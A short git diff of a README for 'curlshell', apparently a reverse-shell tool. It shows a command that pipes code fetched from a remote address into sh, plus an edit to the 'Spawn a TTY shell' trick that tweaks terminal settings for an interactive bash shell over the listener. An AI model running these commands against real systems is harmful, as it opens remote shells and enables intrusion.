@@ -50,8 +50,8 @@ curl -sfL http://1.2.3.4:8080 | sh
 # Advanced Tricks
 **Trick #1 - Spawn a TTY shell**
 ```sh
-stty intr undef ;
-./curlshell.py --shell "script -qc '/bin/bash -il' /dev/null" --listen-port 8080 ; stty intr ^C
+stty intr undef susp undef;
+./curlshell.py --shell "script -qc '/bin/bash -il' /dev/null" --listen-port 8080 ; stty intr ^C susp ^Z
 ```
 
 **Trick #2 - Start the reverse shell as a daemon / background process**  
